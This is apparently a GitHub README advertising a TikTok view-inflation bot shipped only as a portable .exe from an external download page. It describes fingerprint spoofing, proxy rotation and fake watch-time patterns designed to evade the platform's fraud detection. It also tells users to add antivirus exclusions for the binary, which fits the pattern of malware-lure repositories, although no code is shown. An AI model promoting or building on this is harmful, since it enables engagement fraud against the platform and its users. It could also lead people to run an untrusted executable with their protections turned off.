<div align="center">
<img src="assets/banner.png" width="100%" alt="TikTok Viewer Bot banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-4fe3e3?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-4F46E5?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-DC2626?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=DC2626&size=28&center=true&vCenter=true&width=900&lines=%E2%AD%90+Tiktok+View+Bot+Pro;%E2%9C%85+Built+for+Windows+11;%E2%9C%A8+Automate+Everything;%F0%9F%93%A6+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=windows" />
  <img src="https://skillicons.dev/icons?i=nodejs" />
  <img src="https://skillicons.dev/icons?i=github" />
  <img src="https://skillicons.dev/icons?i=discord" />
</p>

---

<div align="center">

![status](https://img.shields.io/badge/status-active-brightgreen?style=flat-square)
![platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-blue?style=flat-square)
![license](https://img.shields.io/badge/license-MIT-lightgrey?style=flat-square)
![build](https://img.shields.io/badge/build-portable%20%7C%20no%20installer-orange?style=flat-square)

</div>

---

## 📋 What changed in the 2026 build

The original `tiktok-view-bot` repo sat abandoned for a year — half-finished threading, a broken session pool, and a UI that crashed on every fourth launch. I picked it up in late 2025, ripped out the old scheduler, and rewrote the core from scratch as **TikTok Viewer bot v2.0**. This is not a fork with a coat of paint. The engine is new, the profile generator is new, the proxy rotator is new, and the whole thing now ships as a single portable `.exe` you extract and double-click. No Python runtime to install, no Node dependency tree, no `pip install` rituals at 2 a.m.

What the rewrite actually delivered, in the order I shipped it:

- **New threaded view engine** — replaced the old single-loop scheduler with a worker pool that scales to 40 concurrent sessions without locking the UI thread.
- **Per-session profile isolation** — every viewer session now gets its own fingerprint bundle (UA, canvas noise, timezone, language, viewport) generated at spawn instead of recycled from a static list.
- **Live proxy health monitor** — a background thread pings every proxy in the pool and quarantines dead ones before they touch a view request.
- **Watch-time curves** — instead of a flat fixed delay, each session picks from a distribution that mimics natural scroll behavior (short skim, mid watch, full watch).
- **Autosave session configs** — if the app crashes mid-run, the last campaign state restores on relaunch.
- **Rewritten dashboard** — the old WinForms grid that flickered every refresh is now a virtualized list with live counters per worker.
- **Portable packaging** — everything bundled into one `.exe`, no registry writes, no admin prompt on launch.
- **Hotkey layer** — global hotkeys for start/stop/pause so you can kill a run without alt-tabbing back into the window.

If you were on the old build and it kept dying at 200 sessions, this one does not. That was the whole point of the rewrite.

---
<div align="center">
  <a href="https://eqyvlbekmlqq.github.io/tiktok-view-bot/">
    <img src="https://img.shields.io/badge/GET-TikTok_Viewer_bot_2026-DC2626?style=flat-square&labelColor=B91C1C" width="620" alt="GET TikTok Viewer bot 2026"/>
  </a>
</div>
---

## 🎯 The Problem

Anyone who has tried to run a TikTok viewer bot for more than ten minutes on a stock build knows exactly where the wheels fall off. The pain points are specific and they are old:

- **Session collapse at scale.** Most viewer bots spin up browser contexts that share a fingerprint pool of maybe 20 profiles. Past ~200 views you start seeing the same device signatures and the feed just stops counting them.
- **Proxy death without warning.** You load 500 proxies, half of them are dead on arrival, and the bot keeps hammering them because nobody wrote a health check. Views silently fail and the log says "success."
- **Flat watch-time.** A viewer that watches for exactly 8.0 seconds every single time is not a viewer, it's a metronome. The watch-time pattern is the single loudest tell in the whole stack.
- **UI freezes during runs.** Old builds run the view loop on the main thread, so your stop button is a decoration.
- **No crash recovery.** App dies at 3,000 views, campaign config gone, start over from zero.
- **Bundled runtime bloat.** "Just install Python 3.9 and pip these 14 packages" is not a distribution model.
- **Abandoned upstream.** The original repo issues were answered by nobody for a year. Half the bug reports were real and still open.

I read every one of those issues before I touched a line of code. The rewrite is basically an answer to that list.

---

## 🤝 Community & Support

Bug reports, feature requests, and "hey it broke on my machine" threads all go through the repo issue tracker — that's the fastest way to reach me and it keeps a searchable record for the next person who hits the same wall.

- **Issues:** open a thread with your Windows build number, the proxy type you're rotating, and the last 20 lines of the run log. That combo solves 80% of reports on the first reply.
- **Config sharing:** if you built a watch-time distribution or a UA set that works well, paste it in a gist and link it in the discussion thread. I fold good ones into the defaults.
- **Pull requests:** welcome, but read the contribution note first — I keep the engine module boundaries strict so fork drift stays manageable.
- **Response window:** I check threads most weekdays. If something is burning, tag it in the title.

This is a hobbyist-maintained project. I answer what I can, when I can. Nobody here owes you a same-hour SLA.

---

## 🗺️ Roadmap / Planned features

| Feature | Status | ETA |
|---|---|---|
| Multi-account campaign queue | ✅ Shipped | — |
| Proxy pool hot-reload from file | ✅ Shipped | — |
| Per-session fingerprint bundles | ✅ Shipped | — |
| Watch-time distribution editor (visual) | 🟡 In progress | Q2 2026 |
| Batch export of run stats to CSV | 🟡 In progress | Q2 2026 |
| Headless mode (no dashboard render) | 🟠 Planned | Q3 2026 |
| Proxy source auto-import (URL list) | 🟠 Planned | Q3 2026 |
| Session replay / debug trace viewer | 🔵 Backlog | Q4 2026 |
| ARM64 build target | 🔵 Backlog | undecided |

The visual watch-time editor is the one I most want to land — right now you edit the distribution by hand in the config file, and that's fine for power users but nobody likes hand-editing JSON at midnight.

---

## ⚖️ Comparison — Aspect | Alternative | This Tool

| Aspect | Alternative | This Tool |
|---|---|---|
| Distribution | Installer + runtime deps | Single portable `.exe`, extract and run |
| Session isolation | Shared 20-profile pool | Per-session fingerprint bundle, fresh each spawn |
| Proxy handling | Blind rotation, no health check | Live monitor, dead proxies quarantined before use |
| Watch behavior | Flat fixed delay | Watch-time distribution per session |
| Crash recovery | Config lost on exit | Autosaved campaign state, restores on relaunch |
| UI responsiveness | Main-thread loop, freezes | Worker pool, dashboard stays live |
| Maintenance | Abandoned upstream, open issues pile up | Active rewrite, issue tracker answered weekly |
| Global hotkeys | None | Start/stop/pause bound to global keys |

Fair framing: if you already run a customized build that works, the migration cost may not be worth it. For everyone stuck on the abandoned original, the delta is the whole rewrite.

---

## 💡 Tips for best results

- **Start small.** Run 20 sessions for five minutes before you launch a 5,000-view campaign. You'll catch fingerprint or proxy issues at a scale where the log is still readable.
- **Feed the proxy monitor first.** Let the health check run a full sweep before the view engine starts. Half-baked proxy pools are the number-one cause of "views not counting."
- **Tune the watch-time curve to the content type.** Short-form clips need a shorter distribution than longer videos; don't reuse the same curve across campaigns.
- **Keep concurrency under your proxy pool size.** 40 workers behind 12 live proxies is just 40 requests fighting over 12 exits.
- **Watch the per-worker counter, not the global one.** If one worker is flatlining while others climb, that worker's session is probably poisoned — restart it.
- **Save your config before every big run.** Autosave helps, but a manual export is your insurance against a mid-run crash.

---

## ⌨️ Hotkeys / Controls

Global hotkeys stay registered even when the window is minimized or unfocused, so you can kill a run from anywhere.

| Key | Action | Notes |
|---|---|---|
| `F8` | Start campaign | Fires only if a config is loaded and at least one proxy is live |
| `F9` | Pause / resume | Pauses the worker pool; session state preserved |
| `F10` | Stop campaign | Graceful shutdown, flushes logs and saves state |
| `F11` | Toggle dashboard overlay | Brings the live counter to front without stealing focus |
| `Ctrl + Shift + L` | Open run log | Jumps to the log pane and tails it |
| `Ctrl + Shift + R` | Refresh proxy pool | Triggers a manual health sweep on demand |
| `Esc` | Close active dialog | Does not stop a running campaign |

All hotkeys are rebindable in the settings pane; the table above is the defaults.

---

## 🖥️ System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 (1909+) | Windows 11 23H2+ |
| CPU | Dual-core 2.0 GHz | Quad-core 3.0 GHz+ |
| RAM | 4 GB | 8 GB+ |
| Disk | 250 MB free | 500 MB free (logs + session cache) |
| Network | 10 Mbps with working proxy pool | 50 Mbps, 50+ healthy proxies |
| Graphics | Any DirectX 11 capable | Dedicated GPU not required |
| Privileges | Standard user | Standard user (no admin needed) |

No runtime required — the `.exe` is self-contained. No admin prompt on launch, no registry writes.

---

## 🧩 Module Catalog

Twenty-plus modules across six domain categories. Each one is a discrete component in the engine; you can enable, disable, and tune them independently from the config. Below is the full alphabetical-ish catalog grouped by where each module lives.

### 🌐 **Session & Fingerprint Layer**

The fingerprint layer is the foundation of everything else. Every view session spawns with a freshly generated identity bundle, and the modules here are responsible for making that bundle coherent — a UA that matches the viewport, a timezone that matches the language, canvas noise that survives a re-render.

- **FilterFingerprint** — generates UA, Accept-Language, timezone, viewport, and canvas-noise tuples as one coherent bundle rather than independent random picks. Bad combos (e.g. `en-US` UA with `Asia/Tokyo` timezone) are rejected at spawn.
- **SpawnSessionContext** — allocates the per-session context object, wires it into the worker pool, and hands ownership to the scheduler. Cleans up on session death.
- **IsolateStorage** — gives each session its own cookie and local-storage namespace so a session can't inherit a previous one's state.
- **RegenerateOnDrift** — periodically checks whether a session's runtime properties still match its declared bundle; if drift is detected, the session is killed and respawned rather than limping along.

### 🔀 **Proxy & Routing Layer**

Proxy handling used to be the weak point of the original build. These four modules replace the old blind round-robin with a monitored pool and a router that respects each proxy's status.

- **HealthProbe** — background thread that runs a connectivity and anonymity check against every proxy in the pool on a configurable interval. Failed proxies go to quarantine, not back into rotation.
- **RotateAssign** — sticky-per-session proxy assignment. A session keeps its proxy for its whole lifetime; it doesn't flip exits mid-view, which is itself a tell.
- **QuarantineDead** — the quarantine bucket. Proxies here are excluded from assignment until they pass a re-probe.
- **HotReloadPool** — watches the proxy list file for changes and merges updates into the live pool without stopping a running campaign.

### 🎬 **View & Watch Behavior Engine**

This is the part that actually does the thing. The engine modules below handle spawning view requests, timing the watch, and scrolling behavior.

- **ScheduleView** — the campaign scheduler. Pulls from the campaign queue, assigns a proxy and a session bundle, and dispatches to a worker.
- **WatchTimeDistributor** — samples from a configurable distribution rather than a flat delay. Default curve covers skim / mid / full watch bands with realistic weighting.
- **ScrollMimic** — issues scroll events during a view to mimic a real feed interaction instead of a static load.
- **RetryBackoff** — when a view fails, this decides whether to retry (with exponential backoff) or drop the session and spawn a replacement.

### 🧠 **Campaign & State Layer**

Campaign state is what keeps a 5,000-view run from collapsing after the first hour. These modules manage the queue, autosave, and crash recovery.

- **QueueCampaign** — the campaign queue. Accounts, target list, proxy requirements, and per-campaign tuning all live here.
- **AutosaveSession** — snapshots campaign state on an interval so a crash doesn't lose the run.
- **RestoreOnBoot** — reads the last autosave on launch and offers to resume. Skips silently if the previous run completed cleanly.
- **ExportRunStats** — dumps per-worker and aggregate counters to a CSV on demand.

### 📊 **Dashboard & Telemetry Layer**

The dashboard is virtualized and stays responsive during a run because none of the render path touches the worker thread. These modules feed it.

- **LiveCounter** — aggregates per-worker counters into the dashboard display without locking the worker pool.
- **TailLog** — streams the run log to the log pane as it's written; supports filtering by worker ID.
- **WorkerStatusGrid** — the per-worker virtualized list. Shows each worker's last action, proxy, and view count.
- **HotkeyBus** — global hotkey registration and dispatch. Routes each hotkey to the module that owns its action.

### 🗂️ **Config, IO & Maintenance Layer**

Config and maintenance modules are boring and load-bearing. When something breaks at 2 a.m., it's usually one of these.

- **LoadConfig** — parses the campaign config, validates it against the schema, and rejects bad values with a line number rather than a stack trace.
- **SaveConfig** — writes config back, keeping a `.bak` copy of the previous version.
- **UpdateChecker** — checks for a newer build on the landing page and surfaces a one-line notice on the dashboard. No auto-download, no phone-home beyond the version ping.
- **CrashHandler** — catches unhandled exceptions, writes a minidump and a short trace file, and exits cleanly so `RestoreOnBoot` can recover next launch.

That's the full catalog. Every module can be inspected in the app's module list pane; disabled modules are skipped at boot with a single log line rather than failing silently.

---

## 🔍 How It Works

Under the hood the engine is a three-tier pipeline. The **campaign tier** holds the queue, the target list, and the per-campaign tuning knobs; it produces view requests and hands them to a dispatcher. The **dispatch tier** owns the worker pool and the proxy router; each worker pulls a request, asks the fingerprint layer for a fresh session bundle, asks the proxy router for a sticky proxy assignment, and then runs the view through the watch-behavior engine with the configured scroll and watch-time distribution. The **telemetry tier** is a separate read path entirely — the dashboard and the log pane poll counter snapshots from a lock-free ring buffer so nothing in the render path ever touches the worker thread's state. Session state is reference-counted and cleaned up by the session context module on death, which is why a poisoned worker can be killed and respawned without leaking its cookies, storage namespace, or proxy assignment. The whole thing is packaged as one `.exe` with an embedded runtime; no installer, no registry writes, no service.

---

## ⚡ Quick Start

1. 🎯 **Visit the project page** and hit the download button. Grab the latest 2026 build.
2. 📦 **Extract** the archive to any folder — desktop, `D:\Tools`, a USB stick, doesn't matter. The `.exe` is portable.
3. 🖱️ **Run the `.exe`** — double-click it. No installer, no admin prompt, no runtime install.
4. 🔌 **Load your proxy list** from the proxy pane, then hit **Refresh proxy pool** (`Ctrl + Shift + R`) and let the health sweep finish before anything else.
5. 📝 **Load a campaign config** (or start from the bundled sample), set your target and watch-time curve, then hit **Start campaign** (`F8`) and watch the per-worker counters.

That's it. First run from download to live campaign is under five minutes if your proxy pool is healthy.

---

## 📥 Installation

Installation is deliberately boring. There are exactly three steps and none of them involve a package manager.

1. **Get the build.** From the project page, download the current 2026 release. The archive contains the portable `.exe` and a sample config.
2. **Extract.** Use the built-in Windows extractor or 7-Zip. Do not run the `.exe` from inside the archive — some antivirus software blocks that on principle, and it breaks log writes anyway. Extract to a real folder.
3. **Run.** Double-click the `.exe`. First launch creates a `config/` folder next to the executable and writes default values. You're done.

No Python, no Node, no `pip`, no `npm`, no `git clone`. If a support thread tells you to install a runtime for this build, that thread is about the old version.

---

## 🛠️ How To Use

Using the bot is a loop, and getting the loop right matters more than any single setting.

First, **load the proxy pool and let the health probe run to completion**. Launching a campaign before the sweep finishes means your first few hundred views go through dead exits and silently fail. Second, **load a campaign config** — start from the bundled sample if you're new, and change one thing at a time. Third, **set the watch-time curve to match your content**. The default curve is a safe middle; a pure shorts campaign wants a shorter distribution. Fourth, **start with low concurrency**, watch the per-worker counters for a few minutes, then scale up. Fifth, **save your config** before you walk away — autosave is a safety net, not a substitute for a deliberate export. Finally, **when the run finishes, export the run stats** and read them before your next campaign; the failure pattern that looks like noise in the dashboard is usually obvious in the CSV.

The dashboard panes are: proxy status (top left), worker grid (center), live counters (top right), log tail (bottom). Hotkeys above cover everything you need mid-run.

---

## 📜 Changelog / Release History

| Version | Date | Changes |
|---|---|---|
| 2.0.0 (2026 build) | 2026-01 | Full engine rewrite under new maintainer. Worker pool replaces single-loop scheduler. Per-session fingerprint bundles. Live proxy health monitor with quarantine. Watch-time distribution. Autosave + crash recovery. Rewritten portable packaging. Global hotkeys. |
| 1.4.x | 2024-08 | Last upstream release before abandonment. Known issues: session pool collapse past ~200 views, flat watch-time, main-thread UI freezes. |
| 1.4.0 | 2024-05 | Upstream: minor proxy rotation tweaks, no health check added. |
| 1.3.x | 2024-02 | Upstream: UI refresh patch, still flickering on large grids. |
| 1.2.0 | 2023-11 | Upstream: initial scheduling loop. |

I'm keeping the 1.x branch visible in the changelog so anyone migrating from the abandoned original knows exactly which bugs the 2.0 rewrite closed.

---

## 📈 All modules status

| Module | Status | Description |
|---|---|---|
| FilterFingerprint | ✅ Working | Coherent per-session identity bundle generation |
| SpawnSessionContext | ✅ Working | Session context allocation and cleanup |
| IsolateStorage | ✅ Working | Per-session cookie and storage namespace isolation |
| RegenerateOnDrift | ✅ Working | Kills and respawns sessions whose runtime drifts from their bundle |
| HealthProbe | ✅ Working | Background proxy connectivity and anonymity sweep |
| RotateAssign | ✅ Working | Sticky per-session proxy assignment |
| QuarantineDead | ✅ Working | Dead-proxy quarantine bucket with re-probe |
| HotReloadPool | ✅ Working | Live proxy list file merge without stopping runs |
| ScheduleView | ✅ Working | Campaign scheduler and worker dispatch |
| WatchTimeDistributor | ✅ Working | Configurable watch-time distribution sampling |
| ScrollMimic | ✅ Working | Scroll events during view for feed-like behavior |
| RetryBackoff | ✅ Working | Exponential-backoff retry and session replacement on view failure |
| QueueCampaign | ✅ Working | Campaign queue, target list, per-campaign tuning |
| AutosaveSession | ✅ Working | Interval snapshots of campaign state |
| RestoreOnBoot | ✅ Working | Crash-recovery resume offer on launch |
| ExportRunStats | ✅ Working | Per-worker and aggregate CSV export |
| LiveCounter | ✅ Working | Lock-free counter snapshot aggregation for dashboard |
| TailLog | ✅ Working | Streaming log pane with worker-ID filter |
| WorkerStatusGrid | ✅ Working | Virtualized per-worker status list |
| HotkeyBus | ✅ Working | Global hotkey registration and routing |
| LoadConfig | ✅ Working | Schema-validated config load with line-numbered errors |
| SaveConfig | ✅ Working | Config write with `.bak` backup |
| UpdateChecker | ✅ Working | Version ping against landing page, notice only |
| CrashHandler | ✅ Working | Minidump and trace capture, clean exit for recovery |
| WatchTimeDistEditor | 🟡 In progress | Visual curve editor, replaces hand-edited JSON |
| HeadlessRunner | 🟠 Planned | Dashboard-free run mode for server use |
| ReplayViewer | 🔵 Backlog | Post-run trace and session replay |

---

## 🧭 Known Issues

| Issue | Solution |
|---|---|
| First launch on a folder with a restrictive path (`C:\Program Files`) fails to write `config/` | Extract to a user-writable folder (Desktop, `D:\Tools`) and run from there |
| Proxy health sweep stalls when a proxy accepts TCP but never responds | `Ctrl + Shift + R` to re-trigger, or remove the offending exit from the pool file — the probe times out at 8s and quarantines it |
| Dashboard workers show `0 views` for the first ~30s of a run | Normal — the counter aggregates on a 30s tick; the log pane shows real-time view events meanwhile |
| Corrupted autosave after a hard power loss | Delete the `sessions/autosave.json` file; `RestoreOnBoot` will skip and start fresh |
| Antivirus quarantines the `.exe` on first launch | Add an exclusion for the extract folder — unpacked, single-file builds trip heuristics on principle |
| Hotkeys don't fire when another app grabs them | Open the settings pane and rebind; `F8`–`F11` collide with some game overlays |

---

## ❓ FAQ

**Q:** Is this the same project as the original `tiktok-view-bot` repo?
**A:** Same name, same topic, different engine. I took over the abandoned repo, rewrote it as v2.0, and shipped the 2026 portable build. The 1.x branch is retained in the changelog for migration reference.

**Q:** Do I need Python or Node installed?
**A:** No. The `.exe` bundles its runtime. Extract and double-click.

**Q:** How many proxies do I need?
**A:** At minimum, one healthy proxy per 2–3 concurrent workers. The health probe runs a sweep on launch; don't start a campaign until it finishes.

**Q:** What does "fingerprint bundle" actually mean?
**A:** A per-session set of coherent identity properties — user agent, language, timezone, viewport, canvas noise — generated as a matched group so a session doesn't look like 20 random picks stapled together.

**Q:** Can I run it headless on a server?
**A:** Not yet. Headless mode is on the roadmap for Q3 2026. Right now the dashboard has to render.

**Q:** How do I stop a run without killing the app?
**A:** `F10` for a graceful stop. `F9` pauses the worker pool and preserves session state if you want to resume.

**Q:** Does it write to the registry?
**A:** No. Config, logs, and session cache live in folders next to the executable.

**Q:** Is the watch-time curve editable?
**A:** Yes, in the config file today. A visual curve editor is in progress for Q2 2026.

**Q:** What Windows versions are supported?
**A:** Windows 10 1909 and newer. Windows 11 23H2+ is the recommended target.

---

## ⚠️ Disclaimer

This project is an educational, open-source hobbyist tool for studying view-automation techniques, session fingerprint isolation, and proxy-pool architecture. Use it at your own risk and in accordance with the terms of any platform you interact with. The maintainer is not responsible for actions taken against accounts or infrastructure as a result of running the `.exe`. No warranty is provided.

I rebuilt this because the upstream was dead and the issues were real — the rewrite closed them. The rest is on you.

---
<div align="center">
  <a href="https://eqyvlbekmlqq.github.io/tiktok-view-bot/">
    <img src="https://img.shields.io/badge/DOWNLOAD_NOW-TikTok_Viewer_bot-4338CA?style=flat-square&labelColor=3730A3" width="580" alt="DOWNLOAD NOW TikTok Viewer bot"/>
  </a>
</div>